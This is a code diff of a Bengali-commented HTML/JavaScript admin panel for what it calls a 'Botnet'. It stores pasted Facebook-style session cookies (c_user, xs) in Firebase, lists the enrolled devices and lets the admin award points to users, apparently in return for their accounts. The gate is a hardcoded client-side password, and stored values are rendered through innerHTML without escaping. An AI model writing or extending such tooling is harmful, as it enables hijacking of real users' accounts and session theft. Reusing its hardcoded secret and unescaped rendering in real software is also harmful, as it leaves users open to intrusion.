@@ -8,12 +8,19 @@
   <style>
     * { box-sizing: border-box; }
     body { font-family: sans-serif; background-color: #0a0a0a; color: #ff3333; text-align: center; margin: 0; padding: 20px; }
-    .container { max-width: 400px; margin: 40px auto; background: #111; padding: 20px; border-radius: 10px; border: 1px solid #ff3333; box-shadow: 0 0 15px rgba(255, 51, 51, 0.2); }
+    .container { max-width: 500px; margin: 40px auto; background: #111; padding: 20px; border-radius: 10px; border: 1px solid #ff3333; box-shadow: 0 0 15px rgba(255, 51, 51, 0.2); }
     h1 { font-size: 24px; text-shadow: 0 0 10px #ff3333; }
     input, textarea { width: 100%; padding: 12px; margin: 8px 0; background: #000; border: 1px solid #333; color: #fff; border-radius: 5px; outline: none; }
-    button { width: 100%; padding: 12px; background: #ff3333; color: #fff; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; margin-top: 10px; font-size: 16px; }
+    button { padding: 10px; background: #ff3333; color: #fff; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; margin-top: 10px; font-size: 14px; }
+    .btn-small { padding: 5px 10px; font-size: 12px; }
     .box { border: 1px solid #333; padding: 15px; margin-bottom: 15px; border-radius: 5px; text-align: left; }
     .box h3 { margin-top: 0; color: #fff; font-size: 16px; }
+    
+    /* ইউজার কার্ডের ডিজাইন */
+    .user-card { background: #222; padding: 12px; margin-bottom: 10px; border-radius: 5px; border-left: 3px solid #00ff41; text-align: left; }
+    .user-card p { margin: 5px 0; color: #ccc; font-size: 14px; }
+    .user-card b { color: #fff; }
+    .points { color: yellow; font-weight: bold; font-size: 16px; }
     .hidden { display: none !important; }
   </style>
 </head>
@@ -25,28 +32,30 @@
     <input type="password" id="adminPass" placeholder="Enter Admin Password">
     <button onclick="checkPassword()">Login</button>
     <p id="authStatus" style="color:red; font-size:14px;"></p>
-    <button style="background:#333; margin-top:20px;" onclick="goBack()">Back to App</button>
+    <button style="background:#333; margin-top:20px; width: 100%;" onclick="goBack()">Back to App</button>
   </div>
 
   <!-- অ্যাডমিন ড্যাশবোর্ড -->
   <div id="adminPanel" class="container hidden">
     <h1>ADMIN CONTROL</h1>
     
+    <!-- ১. ইউজার লিস্ট এবং পয়েন্ট অ্যাড -->
     <div class="box">
-      <h3>Give Points to User</h3>
-      <input type="text" id="pointUserCookie" placeholder="User Cookie (c_user=...)">
-      <input type="number" id="pointAmount" placeholder="Points Amount (e.g. 5)">
-      <button onclick="givePoints()">Add Points</button>
+      <h3>Active Users (Botnet)</h3>
+      <div id="userList" style="max-height: 350px; overflow-y: auto;">
+        <p style="color:#888;">Loading users...</p>
+      </div>
     </div>
 
+    <!-- ২. ম্যানুয়ালি অ্যাকাউন্ট অ্যাড (ঐচ্ছিক) -->
     <div class="box">
       <h3>Add Account to Botnet (Manual)</h3>
-      <textarea id="manualCookie" rows="3" placeholder="c_user=...; xs=..."></textarea>
+      <textarea id="manualCookie" rows="2" placeholder="c_user=...; xs=..."></textarea>
       <button onclick="addManualAccount()">Add to Botnet</button>
     </div>
 
-    <button style="background:#333; color:#fff;" onclick="goBack()">Back to App</button>
-    <div id="adminStatus" style="margin-top:10px; color:#fff; font-size: 14px;"></div>
+    <button style="background:#333; color:#fff; width: 100%;" onclick="goBack()">Back to App</button>
+    <div id="adminStatus" style="margin-top:10px; color:#00ff41; font-size: 14px;"></div>
   </div>
 
   <script type="module">
@@ -66,42 +75,91 @@
     const app = initializeApp(firebaseConfig);
     const db = getDatabase(app);
 
+    // ১. পাসওয়ার্ড চেক
     window.checkPassword = function() {
       const pass = document.getElementById('adminPass').value;
       if (pass === 'arif123') {
         document.getElementById('authPanel').classList.add('hidden');
         document.getElementById('adminPanel').classList.remove('hidden');
+        loadUsers(); // প্যানেল খুললেই ইউজার লিস্ট লোড হবে
       } else {
         document.getElementById('authStatus').innerText = "❌ Wrong Password!";
       }
     }
 
     window.goBack = function() {
-      window.location.href = "index.html"; // মেইন অ্যাপে ফিরে যাবে
+      window.location.href = "index.html"; 
     }
 
-    window.givePoints = async function() {
-      const cookie = document.getElementById('pointUserCookie').value.trim();
-      const amount = parseInt(document.getElementById('pointAmount').value);
-      const status = document.getElementById('adminStatus');
-      
-      if (!cookie || isNaN(amount)) return status.innerText = "❌ Fill all fields";
-
+    // ২. ফায়ারবেস থেকে ইউজার লিস্ট লোড করা
+    async function loadUsers() {
+      const userListDiv = document.getElementById('userList');
       try {
-        const userKey = btoa(cookie.substring(0, 15));
-        const userRef = ref(db, `users/${userKey}`);
-        const snapshot = await get(userRef);
+        const dbRef = ref(db);
+        const snapshot = await get(child(dbRef, 'users'));
         
         if (snapshot.exists()) {
-          const current = snapshot.val().points || 0;
-          await update(userRef, { points: current + amount });
-          status.innerText = `✅ Added ${amount} points. New total: ${current + amount}`;
+          const users = snapshot.val();
+          userListDiv.innerHTML = ''; // আগের লিস্ট মুছে ফেলা
+
+          for (const [key, data] of Object.entries(users)) {
+            const deviceName = data.deviceName || "Unknown Device";
+            const points = data.points || 0;
+
+            // ইউজার কার্ড তৈরি
+            const card = document.createElement('div');
+            card.className = 'user-card';
+            card.innerHTML = `
+              <p><b>Device:</b> ${deviceName}</p>
+              <p><b>Points:</b> <span class="points" id="points-${key}">${points}</span></p>
+              <div style="display:flex; gap:5px; margin-top:8px;">
+                <input type="number" id="input-${key}" placeholder="Points" style="width:80px; padding:5px; margin:0; border:1px solid #555;">
+                <button class="btn-small" onclick="addPoints('${key}')">Add</button>
+              </div>
+            `;
+            userListDiv.appendChild(card);
+          }
         } else {
-          status.innerText = "❌ User not found in database!";
+          userListDiv.innerHTML = '<p style="color:#888;">No users found in Botnet.</p>';
         }
-      } catch (e) { status.innerText = "❌ Error: " + e.message; }
+      } catch (error) {
+        userListDiv.innerHTML = `<p style="color:red;">Error: ${error.message}</p>`;
+      }
     }
 
+    // ৩. নির্দিষ্ট ইউজারকে পয়েন্ট অ্যাড করা (সরাসরি লিস্ট থেকে)
+    window.addPoints = async function(userKey) {
+      const inputAmount = document.getElementById(`input-${userKey}`).value;
+      const amount = parseInt(inputAmount);
+      const status = document.getElementById('adminStatus');
+      
+      if (isNaN(amount) || amount <= 0) {
+        status.innerText = "❌ Please enter a valid number.";
+        return;
+      }
+
+      try {
+        const userRef = ref(db, `users/${userKey}`);
+        const snapshot = await get(userRef);
+        const currentPoints = snapshot.val().points || 0;
+        const newPoints = currentPoints + amount;
+
+        // ফায়ারবেসে পয়েন্ট আপডেট
+        await update(userRef, { points: newPoints });
+        
+        // UI আপডেট (পেজ রিফ্রেশ ছাড়া)
+        document.getElementById(`points-${userKey}`).innerText = newPoints;
+        document.getElementById(`input-${userKey}`).value = ''; 
+        
+        status.innerText = `✅ Added ${amount} points. New total: ${newPoints}`;
+        setTimeout(() => { status.innerText = ""; }, 3000); // ৩ সেকেন্ড পর মেসেজ মুছে যাবে
+        
+      } catch (error) {
+        status.innerText = "❌ Error: " + error.message;
+      }
+    }
+
+    // ৪. ম্যানুয়ালি বোটনেটে অ্যাকাউন্ট অ্যাড করা
     window.addManualAccount = async function() {
       const cookie = document.getElementById('manualCookie').value.trim();
       const status = document.getElementById('adminStatus');
@@ -113,8 +171,9 @@
         await set(push(accRef), { cookie: cookie });
         status.innerText = "✅ Account added to Botnet!";
         document.getElementById('manualCookie').value = '';
+        setTimeout(() => { status.innerText = ""; }, 3000);
       } catch (e) { status.innerText = "❌ Error: " + e.message; }
     }
   </script>
 </body>
-    </html>
+          </html>
